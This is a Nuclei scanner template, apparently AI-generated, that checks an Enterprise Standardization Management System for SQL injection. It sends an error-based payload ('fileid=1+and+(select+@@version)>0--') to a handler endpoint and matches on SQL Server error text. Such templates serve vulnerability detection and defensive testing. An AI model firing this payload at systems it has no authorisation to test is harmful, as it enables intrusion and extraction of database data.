id: enterprise-standardization-sql-injection
info:
  name: Enterprise Standardization Management System SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in the Enterprise Standardization Management System. The issue can be exploited to extract database information.

http:
  - raw:
      - |
        POST /PDCA/ashx/CommentStandardHandler.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=detailInfo&fileid=1+and+(select+@@version)>0--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Microsoft SQL Server"
          - "nvarchar"
          - "转换成数据类型 int 时失败"
        part: body
